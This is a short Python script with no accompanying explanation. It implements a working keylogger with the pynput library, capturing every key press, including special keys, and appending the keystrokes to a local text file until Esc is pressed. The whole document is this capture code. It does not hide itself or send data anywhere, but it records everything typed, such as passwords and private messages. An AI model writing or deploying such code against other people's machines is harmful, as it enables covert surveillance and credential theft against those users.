import pynput.keyboard as kl

log = ""

def on_press(key):
    global log
    try:
        log = log + str(key.char)
    except AttributeError:
        if key == kl.Key.space:
            log = log + " "
        else:
            log = log + " " + str(key) + " "

    if len(log) >= 50:
        write_log(log)
        log = ""

def write_log(log):
    with open("klkeylog.txt" , "a") as f:
        f.write(log)

def on_release(key):
    if key == kl.Key.esc:
        return False

with kl.Listener(on_press=on_press, on_release=on_release) as listener:
    print("logger is running press esc to stop")
    listener.join()